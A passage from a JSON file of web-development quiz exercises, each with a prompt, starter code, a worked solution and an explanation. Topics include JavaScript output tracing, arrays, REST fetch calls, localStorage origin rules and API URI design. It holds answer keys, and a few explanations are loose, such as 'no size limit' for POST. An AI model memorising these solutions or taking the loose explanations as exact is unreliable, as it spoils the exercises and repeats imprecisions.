returned. \u003ccode\u003econsole.log(undefined)\u003c/code\u003e prints \u003ccode\u003eundefined\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTrace B:\u003c/strong\u003e Both calls to \u003ccode\u003esubtract\u003c/code\u003e execute before the outer subtraction. \u003ccode\u003esubtract(23, 12)\u003c/code\u003e returns \u003ccode\u003e11\u003c/code\u003e. \u003ccode\u003esubtract(10, 3)\u003c/code\u003e returns \u003ccode\u003e7\u003c/code\u003e. The expression becomes \u003ccode\u003e11 - 7\u003c/code\u003e, which is \u003ccode\u003e4\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTrace C:\u003c/strong\u003e \u003ccode\u003echeckString(&quot;John&quot;)\u003c/code\u003e evaluates \u003ccode\u003e&quot;John&quot; === &quot;John&quot;\u003c/code\u003e, which is \u003ccode\u003etrue\u003c/code\u003e, and returns it. But no code captures or logs that return value. The call site discards it silently. Nothing is printed to the console.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTrace D:\u003c/strong\u003e The \u003ccode\u003efor\u003c/code\u003e loop iterates \u003ccode\u003ei\u003c/code\u003e from \u003ccode\u003e0\u003c/code\u003e to \u003ccode\u003e3\u003c/code\u003e inclusive. Each iteration calls \u003ccode\u003etripleNumber(i)\u003c/code\u003e and logs the result. \u003ccode\u003e0*3=0\u003c/code\u003e, \u003ccode\u003e1*3=3\u003c/code\u003e, \u003ccode\u003e2*3=6\u003c/code\u003e, \u003ccode\u003e3*3=9\u003c/code\u003e. Each \u003ccode\u003econsole.log\u003c/code\u003e call executes synchronously in order, printing one value per line.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTrace E:\u003c/strong\u003e \u003ccode\u003ehiGenerator(&#39;Hello&#39;)\u003c/code\u003e binds \u003ccode\u003egreeting = &#39;Hello&#39;\u003c/code\u003e and returns the inner function. The inner function is a closure — it captures \u003ccode\u003egreeting\u003c/code\u003e from \u003ccode\u003ehiGenerator\u003c/code\u003e&#39;s scope. After \u003ccode\u003ehiGenerator\u003c/code\u003e returns, \u003ccode\u003egreeting\u003c/code\u003e stays alive because the closure references it. Calling \u003ccode\u003esayHi(&#39;World&#39;)\u003c/code\u003e binds \u003ccode\u003ename = &#39;World&#39;\u003c/code\u003e and evaluates \u003ccode\u003e&#39;Hello&#39; + &#39;, &#39; + &#39;World&#39;\u003c/code\u003e, producing \u003ccode\u003e&#39;Hello, World&#39;\u003c/code\u003e.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":11,"id":"js-arrays-loops","title":"Predict loop and array output","lang":"js","tags":["arrays","for-loop","iteration","index","break"],"source":"ISAQuiz2","prompt_html":"\u003cp\u003ePredict the exact console output for each snippet below. Write your answers before running the code. Check your boundary conditions, break placement, and index arithmetic carefully.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet A\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econst arr = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;];\nconsole.log(arr[arr.length / 2]);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet B\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003elet arr = [];\narr[1] = 1234;\nconsole.log(arr[0]);\nconsole.log(arr[1]);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet C\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003efor (let i = 0; i &lt; 5; i++) {\n  if (i === 2) break;\n  console.log(i);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet D\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econst arr = [10, 20, 30];\nfor (let i = 0; i &lt; 3; i++) {\n  console.log(arr[i - i]);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet E\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econst names = [[&#39;Alice&#39;, &#39;Bob&#39;], [&#39;Carol&#39;, &#39;Dave&#39;], [&#39;Eve&#39;, &#39;Frank&#39;]];\nconsole.log(names[2][1]);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet F\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econst arr = [1, 2, 3, 4, 5, 6];\narr.length = 4;\nconsole.log(arr.length);\nconsole.log(arr[4]);\n\u003c/code\u003e\u003c/pre\u003e","starter":"// Work through each snippet — write your predicted output as comments,\n// then verify by running the code.\n\n// Snippet A — arr.length / 2 as an index\nconst arrA = ['a', 'b', 'c', 'd', 'e', 'f'];\n// Your prediction: arr[?] = ?\nconsole.log(arrA[arrA.length / 2]);\n\n// Snippet B — sparse array\nlet arrB = [];\narrB[1] = 1234;\n// Your prediction for arrB[0]: ?\n// Your prediction for arrB[1]: ?\nconsole.log(arrB[0]);\nconsole.log(arrB[1]);\n\n// Snippet C — break placement\nfor (let i = 0; i \u003c 5; i++) {\n  if (i === 2) break;\n  console.log(i);\n}\n\n// Snippet D — i - i index expression\nconst arrD = [10, 20, 30];\nfor (let i = 0; i \u003c 3; i++) {\n  console.log(arrD[i - i]);\n}\n\n// Snippet E — nested array access\nconst names = [['Alice', 'Bob'], ['Carol', 'Dave'], ['Eve', 'Frank']];\nconsole.log(names[2][1]);\n\n// Snippet F — length truncation\nconst arrF = [1, 2, 3, 4, 5, 6];\narrF.length = 4;\nconsole.log(arrF.length);\nconsole.log(arrF[4]);","solution":"// Snippet A\nconst arrA = ['a', 'b', 'c', 'd', 'e', 'f'];\nconsole.log(arrA[arrA.length / 2]); // 'd'\n// arrA.length = 6; 6/2 = 3; arrA[3] = 'd'\n\n// Snippet B\nlet arrB = [];\narrB[1] = 1234;\nconsole.log(arrB[0]); // undefined\nconsole.log(arrB[1]); // 1234\n// Slot 0 was never assigned — it is a sparse hole that reads as undefined.\n\n// Snippet C\nfor (let i = 0; i \u003c 5; i++) {\n  if (i === 2) break;\n  console.log(i);\n}\n// Output: 0, 1\n// When i === 2, break fires before console.log runs. Only 0 and 1 are printed.\n\n// Snippet D\nconst arrD = [10, 20, 30];\nfor (let i = 0; i \u003c 3; i++) {\n  console.log(arrD[i - i]);\n}\n// Output: 10, 10, 10\n// i - i evaluates to 0 for every i. Every iteration reads arrD[0] = 10.\n\n// Snippet E\nconst names = [['Alice', 'Bob'], ['Carol', 'Dave'], ['Eve', 'Frank']];\nconsole.log(names[2][1]); // 'Frank'\n// names[2] = ['Eve', 'Frank']; index 1 of that sub-array = 'Frank'.\n\n// Snippet F\nconst arrF = [1, 2, 3, 4, 5, 6];\narrF.length = 4;\nconsole.log(arrF.length); // 4\nconsole.log(arrF[4]);     // undefined\n// Setting .length = 4 deletes indices 4 and 5. arrF[4] no longer exists.","why_html":"\u003cp\u003e\u003cstrong\u003eSnippet A:\u003c/strong\u003e \u003ccode\u003earr.length / 2\u003c/code\u003e gives the integer index of the element one past the midpoint in a 6-element array. Because JavaScript arrays are zero-indexed, index \u003ccode\u003e3\u003c/code\u003e is the fourth element.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet B:\u003c/strong\u003e Assigning to \u003ccode\u003earr[1]\u003c/code\u003e without assigning \u003ccode\u003earr[0]\u003c/code\u003e creates a sparse array. The engine sets \u003ccode\u003earr.length\u003c/code\u003e to \u003ccode\u003e2\u003c/code\u003e, but slot \u003ccode\u003e0\u003c/code\u003e is a hole. Reading a hole returns \u003ccode\u003eundefined\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet C:\u003c/strong\u003e \u003ccode\u003ebreak\u003c/code\u003e exits the current loop iteration entirely — the rest of the loop body does not run for that \u003ccode\u003ei\u003c/code\u003e. Because the \u003ccode\u003ebreak\u003c/code\u003e check appears before \u003ccode\u003econsole.log\u003c/code\u003e, the value \u003ccode\u003e2\u003c/code\u003e is never printed.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet D:\u003c/strong\u003e \u003ccode\u003ei - i\u003c/code\u003e always equals \u003ccode\u003e0\u003c/code\u003e regardless of \u003ccode\u003ei\u003c/code\u003e. The index expression never advances, so the same element (\u003ccode\u003earr[0]\u003c/code\u003e) prints on every iteration. This is a common distractor in quizzes.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet E:\u003c/strong\u003e Two bracket expressions chain left-to-right. \u003ccode\u003enames[2]\u003c/code\u003e selects the third sub-array. \u003ccode\u003e[1]\u003c/code\u003e then selects the second element of that sub-array.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSnippet F:\u003c/strong\u003e Reducing \u003ccode\u003earr.length\u003c/code\u003e permanently deletes all elements at indices equal to or greater than the new length. Reading a deleted index returns \u003ccode\u003eundefined\u003c/code\u003e, not an error. This mirrors the sparse-array behavior from Snippet B.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":12,"id":"rest-anatomy","title":"HTTP method selection for a patient API","lang":"js","tags":["REST","HTTP-methods","fetch","express"],"source":"Slide 8, Quiz 7","prompt_html":"\u003cp\u003eGiven a patient management API at \u003ccode\u003ehttps://api.example.com/v1/patients\u003c/code\u003e, write the client-side JavaScript \u003ccode\u003efetch()\u003c/code\u003e calls for:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eGet all patients\u003c/li\u003e\n\u003cli\u003eCreate a new patient named &quot;Alice&quot;, age 30\u003c/li\u003e\n\u003cli\u003eReplace patient #5&#39;s record entirely (id=5, name=&quot;Bob&quot;, age=25)\u003c/li\u003e\n\u003cli\u003eDelete patient #5\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eUse the correct HTTP method for each operation.\u003c/p\u003e\n\u003chr\u003e","starter":"const BASE = \"https://api.example.com/v1/patients\";\n\n// 1. Get all patients\nasync function getAllPatients() {\n  // TODO: fetch with the correct HTTP method\n  // Hint: this method is bookmarkable and cached\n}\n\n// 2. Create a new patient: { name: \"Alice\", age: 30 }\nasync function createPatient(data) {\n  // TODO: fetch with the correct HTTP method\n  // Hint: this method has no size limit and creates a new resource\n  // Hint: include Content-Type header and put data in the body\n}\n\n// 3. Replace patient #5 entirely: { id: 5, name: \"Bob\", age: 25 }\nasync function replacePatient(id, data) {\n  // TODO: fetch with the correct HTTP method\n  // Hint: this method replaces the ENTIRE record; it is idempotent\n}\n\n// 4. Delete patient #5\nasync function deletePatient(id) {\n  // TODO: fetch with the correct HTTP method\n  // Only the ID is needed — no body\n}","solution":"const BASE = \"https://api.example.com/v1/patients\";\n\n// 1. Get all patients\nasync function getAllPatients() {\n  const res = await fetch(`${BASE}/`);\n  const patients = await res.json();\n  return patients;\n}\n\n// 2. Create a new patient\nasync function createPatient(data) {\n  const res = await fetch(`${BASE}/`, {\n    method: \"POST\",\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n    body: JSON.stringify(data),\n  });\n  // Expect 201 Created\n  const newPatient = await res.json();\n  return newPatient;\n}\n\n// 3. Replace patient #5 entirely\nasync function replacePatient(id, data) {\n  const res = await fetch(`${BASE}/${id}`, {\n    method: \"PUT\",\n    headers: {\n      \"Content-Type\": \"application/json\",\n    },\n    body: JSON.stringify(data),\n  });\n  // Expect 200 OK — resource replaced, not newly created\n  const updated = await res.json();\n  return updated;\n}\n\n// 4. Delete patient #5\nasync function deletePatient(id) {\n  const res = await fetch(`${BASE}/${id}`, {\n    method: \"DELETE\",\n  });\n  // Expect 200 OK or 204 No Content\n  return res.status;\n}\n\n// Usage\ncreatePatient({ name: \"Alice\", age: 30 });\nreplacePatient(5, { id: 5, name: \"Bob\", age: 25 });\ndeletePatient(5);","why_html":"\u003cp\u003e\u003cstrong\u003eOperation 1 — GET:\u003c/strong\u003e\n\u003ccode\u003efetch()\u003c/code\u003e defaults to GET when no \u003ccode\u003emethod\u003c/code\u003e is specified. GET retrieves data without modifying server state. GET requests are bookmarkable — the browser can save \u003ccode\u003ehttps://api.example.com/v1/patients/\u003c/code\u003e as a bookmark and replay it. GET responses are also cached by the browser. GET is not limited to simple cases: it is the correct method for any read-only operation.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOperation 2 — POST:\u003c/strong\u003e\nPOST creates a new resource. The patient data goes in the request body, not the URL, so there is no size limit — POST can send gigabytes of data where GET cannot. The \u003ccode\u003eContent-Type: application/json\u003c/code\u003e header tells the server how to parse the body. The server returns \u003ccode\u003e201 Created\u003c/code\u003e (not \u003ccode\u003e200 OK\u003c/code\u003e) because a new resource was created.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOperation 3 — PUT:\u003c/strong\u003e\nPUT replaces the entire resource at a URI. Sending \u003ccode\u003ePUT /patients/5\u003c/code\u003e with \u003ccode\u003e{ id: 5, name: &quot;Bob&quot;, age: 25 }\u003c/code\u003e overwrites every field of patient #5&#39;s record with the provided values. PUT is idempotent — sending the same PUT request 10 times leaves the record in the same state as sending it once. The server returns \u003ccode\u003e200 OK\u003c/code\u003e here (not \u003ccode\u003e201\u003c/code\u003e) because the resource already existed; it was replaced, not created. Do not use PATCH here — PATCH updates only the fields you send, not the whole record.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOperation 4 — DELETE:\u003c/strong\u003e\nDELETE removes the specified resource. Only the resource ID is needed in the URL — no request body is required. DELETE is idempotent: deleting patient #5 twice leaves the same result (patient #5 does not exist).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus code note:\u003c/strong\u003e Watch for the \u003ccode\u003e201 Created\u003c/code\u003e vs \u003ccode\u003e200 OK\u003c/code\u003e distinction. After \u003ccode\u003ecreatePatient()\u003c/code\u003e, the server returns \u003ccode\u003e201\u003c/code\u003e. After \u003ccode\u003ereplacePatient()\u003c/code\u003e, the server returns \u003ccode\u003e200\u003c/code\u003e. The difference matters on the exam.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":13,"id":"json-localstorage","title":"localStorage origin scope and JSON storage","lang":"js","tags":["localStorage","JSON","origin","sessionStorage"],"source":"Quiz 5 Q2, Q6, Slide 2","prompt_html":"\u003cp\u003eThe file \u003ccode\u003ewrite.html\u003c/code\u003e at \u003ccode\u003ehttp://myDomain.com/write.html\u003c/code\u003e runs:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003elocalStorage.setItem(&quot;user&quot;, JSON.stringify({ name: &quot;Alice&quot;, role: &quot;admin&quot; }));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eExercise 1.\u003c/strong\u003e Write the code in \u003ccode\u003eread.html\u003c/code\u003e at \u003ccode\u003ehttp://myDomain.com/read.html\u003c/code\u003e to retrieve and parse the user object. Print \u003ccode\u003euser.name\u003c/code\u003e to the console.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eExercise 2.\u003c/strong\u003e Which of these URLs can also access that same localStorage entry? For each, state whether access is \u003cstrong\u003eallowed\u003c/strong\u003e or \u003cstrong\u003eblocked\u003c/strong\u003e, and explain why using the origin rule (protocol + domain + port).\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA: \u003ccode\u003ehttp://myDomain.com/fetch.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eB: \u003ccode\u003ehttps://myDomain.com/read.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eC: \u003ccode\u003ehttp://sub.myDomain.com/read.html\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eOrigin scope diagram:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-svg\"\u003e&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;640&quot; height=&quot;200&quot; font-family=&quot;monospace&quot; font-size=&quot;13&quot;&gt;\n  &lt;!-- Box 1: Same origin (shared) --&gt;\n  &lt;rect x=&quot;10&quot; y=&quot;20&quot; width=&quot;190&quot; height=&quot;160&quot; rx=&quot;6&quot; fill=&quot;#d4edda&quot; stroke=&quot;#28a745&quot; stroke-width=&quot;1.5&quot;/&gt;\n  &lt;text x=&quot;105&quot; y=&quot;42&quot; text-anchor=&quot;middle&quot; font-weight=&quot;bold&quot; fill=&quot;#155724&quot;&gt;Same origin → shared&lt;/text&gt;\n  &lt;text x=&quot;105&quot; y=&quot;62&quot; text-anchor=&quot;middle&quot; fill=&quot;#155724&quot;&gt;http://myDomain.com/a.html&lt;/text&gt;\n  &lt;text x=&quot;105&quot; y=&quot;80&quot; text-anchor=&quot;middle&quot; fill=&quot;#155724&quot;&gt;http://myDomain.com/b.html&lt;/text&gt;\n  &lt;text x=&quot;105&quot; y=&quot;98&quot; text-anchor=&quot;middle&quot; fill=&quot;#155724&quot;&gt;http://myDomain.com/c.html&lt;/text&gt;\n  &lt;text x=&quot;105&quot; y=&quot;120&quot; text-anchor=&quot;middle&quot; fill=&quot;#155724&quot; font-size=&quot;11&quot;&gt;protocol ✓  domain ✓  port ✓&lt;/text&gt;\n  &lt;text x=&quot;105&quot; y=&quot;140&quot; text-anchor=&quot;middle&quot; fill=&quot;#155724&quot; font-size=&quot;11&quot;&gt;path irrelevant&lt;/text&gt;\n\n  &lt;!-- Box 2: Different protocol (blocked) --&gt;\n  &lt;rect x=&quot;225&quot; y=&quot;20&quot; width=&quot;190&quot; height=&quot;160&quot; rx=&quot;6&quot; fill=&quot;#f8d7da&quot; stroke=&quot;#dc3545&quot; stroke-width=&quot;1.5&quot;/&gt;\n  &lt;text x=&quot;320&quot; y=&quot;42&quot; text-anchor=&quot;middle&quot; font-weight=&quot;bold&quot; fill=&quot;#721c24&quot;&gt;Different protocol → blocked&lt;/text&gt;\n  &lt;text x=&quot;320&quot; y=&quot;66&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot;&gt;http://myDomain.com/a.html&lt;/text&gt;\n  &lt;text x=&quot;320&quot; y=&quot;88&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot;&gt;vs&lt;/text&gt;\n  &lt;text x=&quot;320&quot; y=&quot;110&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot;&gt;https://myDomain.com/a.html&lt;/text&gt;\n  &lt;text x=&quot;320&quot; y=&quot;135&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot; font-size=&quot;11&quot;&gt;http ≠ https → different origin&lt;/text&gt;\n\n  &lt;!-- Box 3: Different subdomain (blocked) --&gt;\n  &lt;rect x=&quot;440&quot; y=&quot;20&quot; width=&quot;190&quot; height=&quot;160&quot; rx=&quot;6&quot; fill=&quot;#f8d7da&quot; stroke=&quot;#dc3545&quot; stroke-width=&quot;1.5&quot;/&gt;\n  &lt;text x=&quot;535&quot; y=&quot;42&quot; text-anchor=&quot;middle&quot; font-weight=&quot;bold&quot; fill=&quot;#721c24&quot;&gt;Different subdomain → blocked&lt;/text&gt;\n  &lt;text x=&quot;535&quot; y=&quot;66&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot;&gt;http://myDomain.com/a.html&lt;/text&gt;\n  &lt;text x=&quot;535&quot; y=&quot;88&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot;&gt;vs&lt;/text&gt;\n  &lt;text x=&quot;535&quot; y=&quot;110&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot;&gt;http://sub.myDomain.com/a.html&lt;/text&gt;\n  &lt;text x=&quot;535&quot; y=&quot;135&quot; text-anchor=&quot;middle&quot; fill=&quot;#721c24&quot; font-size=&quot;11&quot;&gt;subdomain ≠ domain → different origin&lt;/text&gt;\n&lt;/svg&gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003eExercise 3.\u003c/strong\u003e \u003ccode\u003ehttps://aaa.com/labs/1/index.html\u003c/code\u003e stores:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003elocalStorage.setItem(&quot;session&quot;, &quot;abc123&quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich URL can read \u003ccode\u003e&quot;session&quot;\u003c/code\u003e?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA: \u003ccode\u003ehttps://lab.aaa.com/1/index.html\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eB: \u003ccode\u003ehttps://aaa.com/labs/5/hello.html\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExplain why one is accessible and one is blocked.\u003c/p\u003e\n\u003chr\u003e","starter":"// ── Exercise 1: read.html ─────────────────────────────────────────────────\n\n// TODO 1: Retrieve the raw string stored under the key \"user\"\nconst raw = /* ??? */;\n\n// TODO 2: Parse raw back to a JavaScript object\nconst user = /* ??? */;\n\n// TODO 3: Print user.name to the console\nconsole.log(/* ??? */);\n\n\n// ── Exercise 2: Origin analysis table ────────────────────────────────────\n// Fill in \"allowed\" or \"blocked\" and the reason for each URL.\n// Base URL: http://myDomain.com/write.html\n\nconst originAnalysis = [\n  {\n    url: \"http://myDomain.com/fetch.html\",\n    access: \"???\",   // allowed or blocked?\n    reason: \"???\"\n  },\n  {\n    url: \"https://myDomain.com/read.html\",\n    access: \"???\",\n    reason: \"???\"\n  },\n  {\n    url: \"http://sub.myDomain.com/read.html\",\n    access: \"???\",\n    reason: \"???\"\n  }\n];\n\n\n// ── Exercise 3: aaa.com scenario ─────────────────────────────────────────\n// Which URL can read the \"session\" value?\n// A: https://lab.aaa.com/1/index.html\n// B: https://aaa.com/labs/5/hello.html\n\nconst aaaAnswer = {\n  canAccess: \"???\",    // \"A\", \"B\", or \"both\"\n  reason: \"???\"\n};","solution":"// ── Exercise 1: read.html ─────────────────────────────────────────────────\n\nconst raw = localStorage.getItem(\"user\");\n// raw === '{\"name\":\"Alice\",\"role\":\"admin\"}'\n\nconst user = JSON.parse(raw);\n// user === { name: \"Alice\", role: \"admin\" }\n\nconsole.log(user.name);\n// \"Alice\"\n\n\n// ── Exercise 2: Origin analysis table ────────────────────────────────────\n// Base URL: http://myDomain.com/write.html  (protocol=http, domain=myDomain.com, port=80)\n\nconst originAnalysis = [\n  {\n    url: \"http://myDomain.com/fetch.html\",\n    access: \"allowed\",\n    reason: \"Same protocol (http), same domain (myDomain.com), same port (80). Path differs — irrelevant.\"\n  },\n  {\n    url: \"https://myDomain.com/read.html\",\n    access: \"blocked\",\n    reason: \"Different protocol: https ≠ http. Protocol is part of the origin — this is a different origin.\"\n  },\n  {\n    url: \"http://sub.myDomain.com/read.html\",\n    access: \"blocked\",\n    reason: \"Different subdomain: sub.myDomain.com ≠ myDomain.com. A subdomain is a distinct origin.\"\n  }\n];\n\n\n// ── Exercise 3: aaa.com scenario ─────────────────────────────────────────\n// Base: https://aaa.com/labs/1/index.html  (protocol=https, domain=aaa.com, port=443)\n\nconst aaaAnswer = {\n  canAccess: \"B\",\n  reason:\n    \"B (https://aaa.com/labs/5/hello.html): same protocol (https), same domain (aaa.com), \" +\n    \"same port (443). Path /labs/5/hello.html differs from /labs/1/index.html — path is irrelevant. \" +\n    \"A (https://lab.aaa.com/1/index.html) is blocked: lab.aaa.com is a different subdomain from \" +\n    \"aaa.com, making it a completely different origin.\"\n};","why_html":"\u003cp\u003e\u003cstrong\u003eOrigin = protocol + domain + port — path is irrelevant.\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThe browser enforces origin isolation as a security boundary. localStorage is one of the resources protected by this boundary. When a page calls \u003ccode\u003elocalStorage.setItem\u003c/code\u003e, the browser tags that data with the page&#39;s origin. Every \u003ccode\u003egetItem\u003c/code\u003e call checks whether the caller&#39;s origin matches — if not, the request is denied (or returns its own empty bucket).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy the path does not matter:\u003c/strong\u003e the origin is computed before the path is evaluated. \u003ccode\u003e/write.html\u003c/code\u003e and \u003ccode\u003e/read.html\u003c/code\u003e are just different files on the same server under the same protocol and port. The browser treats the entire server (for that protocol+port) as one origin.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy a subdomain creates a new origin:\u003c/strong\u003e \u003ccode\u003esub.myDomain.com\u003c/code\u003e is a fully distinct hostname. DNS resolves it separately. Even if it points to the same server, the browser treats it as a separate origin by spec. A malicious subdomain (e.g., a compromised CDN) must not be able to read the main domain&#39;s localStorage.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy a protocol switch creates a new origin:\u003c/strong\u003e \u003ccode\u003ehttp\u003c/code\u003e and \u003ccode\u003ehttps\u003c/code\u003e run on different ports (80 vs 443) and have different security properties. An unencrypted \u003ccode\u003ehttp\u003c/code\u003e page must not be able to read data stored by an encrypted \u003ccode\u003ehttps\u003c/code\u003e page — they are separate origins.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy JSON.stringify is required:\u003c/strong\u003e localStorage only stores strings. Passing an object directly calls \u003ccode\u003e.toString()\u003c/code\u003e on it, which produces \u003ccode\u003e&quot;[object Object]&quot;\u003c/code\u003e — the object&#39;s structure is lost. \u003ccode\u003eJSON.stringify\u003c/code\u003e produces a proper string encoding (\u003ccode\u003e&#39;{&quot;name&quot;:&quot;Alice&quot;}&#39;\u003c/code\u003e) that \u003ccode\u003eJSON.parse\u003c/code\u003e can reconstruct exactly. This is also why nested objects work: JSON is a recursive string format, so any depth of nesting serializes correctly.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":14,"id":"restful-url-design","title":"Design the URI table for a blog API","lang":"text","tags":["REST","URL-design","versioning","plural-nouns"],"source":"Slide 11","prompt_html":"\u003cp\u003eDesign the complete URI table for a blog API with two resources: \u003ccode\u003eposts\u003c/code\u003e and \u003ccode\u003ecomments\u003c/code\u003e. The API must support:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eList all posts\u003c/li\u003e\n\u003cli\u003eCreate a post\u003c/li\u003e\n\u003cli\u003eGet one post by ID\u003c/li\u003e\n\u003cli\u003eUpdate a post entirely\u003c/li\u003e\n\u003cli\u003eDelete a post\u003c/li\u003e\n\u003cli\u003eList all comments on a specific post\u003c/li\u003e\n\u003cli\u003eCreate a comment on a specific post\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eUse RESTful conventions: plural nouns, \u003ccode\u003e{id}\u003c/code\u003e path parameters, HTTP methods as the action verb (no verbs in URIs).\u003c/p\u003e\n\u003cp\u003eAlso answer: the API is currently at v1. What URI prefix should you use for versioned endpoints? What URI should a client call if they always want the latest version?\u003c/p\u003e","starter":"| HTTP method | URI                          | Action                             |\n|-------------|------------------------------|------------------------------------|\n| GET         |                              | List all posts                     |\n| POST        |                              | Create a new post                  |\n| GET         |                              | Get a specific post by ID          |\n| PUT         |                              | Replace a specific post entirely   |\n| DELETE      |                              | Delete a specific post             |\n| GET         |                              | List all comments on a post        |\n| POST        |                              | Create a comment on a specific post|","solution":"| HTTP method | URI                                    | Action                              |\n|-------------|----------------------------------------|-------------------------------------|\n| GET         | /v1/posts                              | List all posts                      |\n| POST        | /v1/posts                              | Create a new post                   |\n| GET         | /v1/posts/{post-id}                    | Get a specific post by ID           |\n| PUT         | /v1/posts/{post-id}                    | Replace a specific post entirely    |\n| DELETE      | /v1/posts/{post-id}                    | Delete a specific post              |\n| GET         | /v1/posts/{post-id}/comments           | List all comments on a post         |\n| POST        | /v1/posts/{post-id}/comments           | Create a comment on a specific post |","why_html":"\u003cp\u003e\u003cstrong\u003eWhy plural nouns?\u003c/strong\u003e\n\u003ccode\u003e/posts\u003c/code\u003e represents the entire collection of posts. \u003ccode\u003e/posts/{post-id}\u003c/code\u003e represents one item in that collection. The same path prefix serves both purposes — collection operations at the root, single-resource operations with an appended ID segment. Singular nouns (\u003ccode\u003e/post\u003c/code\u003e) break this symmetry and make the collection endpoint read incorrectly.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003e{post-id}\u003c/code\u003e in the path and not as a query string?\u003c/strong\u003e\nPath parameters encode resource identity. \u003ccode\u003eGET /posts/42\u003c/code\u003e says &quot;the resource at this specific address is post 42.&quot; Query strings encode customization: \u003ccode\u003eGET /posts?author=jane\u003c/code\u003e filters the collection. Using \u003ccode\u003eGET /posts?id=42\u003c/code\u003e for a single resource blurs the line between identity and filtering, and PUT/DELETE have no natural place to accept a query string for identity.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat triggers a new version?\u003c/strong\u003e\nVersion only when a breaking change is made: the format of response data changes, a field type changes (for example, \u003ccode\u003eid\u003c/code\u003e changes from integer to UUID string), or an endpoint is removed. Adding new optional fields or new endpoints is non-breaking and does not require incrementing the version.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat does \u003ccode\u003e/posts\u003c/code\u003e → redirect to \u003ccode\u003e/v2/posts\u003c/code\u003e mean?\u003c/strong\u003e\nThe unversioned path is a convenience pointer that always redirects to the latest version using an HTTP \u003ccode\u003e3xx\u003c/code\u003e status code. A client calling \u003ccode\u003e/posts\u003c/code\u003e follows the redirect automatically and receives the v2 response. This works only if versioning was in place before the first public release — clients that already call \u003ccode\u003e/posts\u003c/code\u003e without a version prefix have no migration step when the pointer advances from v1 to v2.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":15,"id":"ajax-cors","title":"AJAX and CORS — server configuration practice","lang":"js","tags":["AJAX","CORS","XMLHttpRequest","readyState"],"source":"Slide 